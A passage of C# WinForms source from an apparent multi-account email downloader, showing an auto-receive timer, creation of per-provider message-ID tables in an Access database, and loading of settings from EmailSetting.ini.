                    this.timerAutoReceive.Interval = 0x36ee80 * Convert.ToInt32("1");
                }
                this.timerAutoReceive.Start();
            }
            else
            {
                this.queueUsers.Clear();
                this.ButtonReceiveEmail.Enabled = true;
                this.toolStripButtonAllReceive.Enabled = true;
                this.ButtonStopReceiveEmail.Enabled = true;
                this.Auto = false;
                this.timerAutoReceive.Enabled = false;
                this.timerAutoReceive.Stop();
            }

        }

        private void timerAutoReceive_Tick(object sender, EventArgs e)
        {
            try
            {
                int count = this.dataGridView.Rows.Count;
                if (this.toolStripComboBoxThreadsText.Text != "")
                {
                    if (count > 0)
                    {
                        for (int i = 0; i < count; i++)
                        {
                            this.userDataSet.Tables["users"].Rows[i]["接收时间"].ToString();
                            if ((this.userDataSet.Tables["users"].Rows[i]["接收时间"].ToString() == "True") && !this.EnqueueUser(i))
                            {
                                this.listBoxView.Items.Add("写入用户索引失败:");
                                this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                            }
                        }
                        this.ThreadCounts = Convert.ToInt32(this.toolStripComboBoxThreadsText.Text);
                    }
                    else
                    {
                        this.listBoxView.Items.Add("没有可供下载的用户");
                        this.listBoxView.SelectedIndex = this.listBoxView.Items.Count - 1;
                    }
                }
                else
                {
                    this.listBoxView.Items.Add("请输入线程数");
                }
            }
            catch (Exception)
            {
            }

        }

        private void PopMailControl_Load(object sender, EventArgs e)
        {
            this.ThreadCounts = 1;
            if (this.ConnectMdb())
            {
                this.oleDbConnection.Open();
                string str = "0";
                string strSql = "update users set 接收状态=" + str;
                this.ExecuteSQL(strSql);
                UpdateUserDataSet();
                this.toolStripComboBoxThreadsText.SelectedIndex = 0;
                this.toolStripComboBoxAutoText.Text = "否";
                this.buttonChange(false);
                //  this.LastTimeLogin();
                try
                {
                    strSql = "select * from MailBoxList";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE MailBoxList([MailBoxListID] AUTOINCREMENT,[序号] int,[MailBoxName] text(255),[MailBoxTotal] int,[MailBoxReadNum] int,[MailBoxUNreadNum] int,PRIMARY KEY ([MailBoxListID]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from AolmailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE AolmailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from 163mailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE 163mailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from Vip163mailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE Vip163mailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from 126mailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE 126mailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from 263mailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE 263mailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from FastmailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE FastmailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from TomMailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE TomMailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from QQMailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE QQMailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from SinaMailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE SinaMailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from 21CNMailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE 21CNMailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from HanMailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE HanMailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from ImapMailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE ImapMailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from MailHNId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE MailHNId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from YmailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE YmailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from RediffmailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE RediffmailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from RamblerRumailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE RamblerRumailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                try
                {
                    strSql = "select * from YandexRumailId";
                    this.ExecuteSQL(strSql);
                }
                catch
                {
                    strSql = "CREATE TABLE YandexRumailId([编号] AUTOINCREMENT,[Name] text(80),[MsgId] text(255),[DownTime] date,[MailType] text(50),PRIMARY KEY ([编号]));";
                    this.ExecuteSQL(strSql);
                }
                if (File.Exists(AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini"))
                {
                    this.saveFilePath = Setting.GetIniValue("Email", "File Path", "", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini");
                    this.TimeInterval = Setting.GetIniValue("Email", "Receive IntervalTime", "1  小时", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini");
                    this.SaveAttachment = Setting.GetIniValue("Email", "Save Attachment", "是", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini") == "是";
                    string str3 = Setting.GetIniValue("Email", "EmailDateTime", "无限制", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini");
                    this.PageNumber = Setting.GetIniValue("Email", "Page Number", "0", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini");
                    this.checkDateSave = "True" == Setting.GetIniValue("Email", "IsDataSave", "True", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini");
                    if (str3.Trim() == "无限制")
                    {
                        this.EmailDateTime = DateTime.Now.AddYears(-50);
                    }
                    else if (str3.Trim().IndexOf(" ") != -1)
                    {
                        str3 = str3.Substring(0, str3.IndexOf(" "));
                        if (str3 != "")
                        {
                            GlobalValue.PopMainForm.EmailDateTime = DateTime.Now.AddMonths(Convert.ToInt32("-" + str3));
                        }
                        else
                        {
                            GlobalValue.PopMainForm.EmailDateTime = DateTime.Now.AddYears(-50);
                        }
                    }
                    else
                    {
                        GlobalValue.PopMainForm.EmailDateTime = Convert.ToDateTime(str3.Trim());
                    }
                }
                else
                {
                    Setting.SetIniValue("Email", "File Path", "", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini");
                    Setting.SetIniValue("Email", "Receive IntervalTime", "1  小时", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini");
                    Setting.SetIniValue("Email", "EmailDateTime", "无限制", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini");
                    Setting.SetIniValue("Email", "Save Attachment", "是", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini");
                    Setting.SetIniValue("Email", "Page Number", "0", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini");
                    Setting.SetIniValue("Email", "IsDataSave", "True", AppDomain.CurrentDomain.BaseDirectory + @"\EmailSetting.ini");
                    this.saveFilePath = "";
                    this.TimeInterval = "1  小时";
                    this.SaveAttachment = true;
                    this.EmailDateTime = DateTime.Now.AddYears(-50);
                }
            }
        }
    }
}
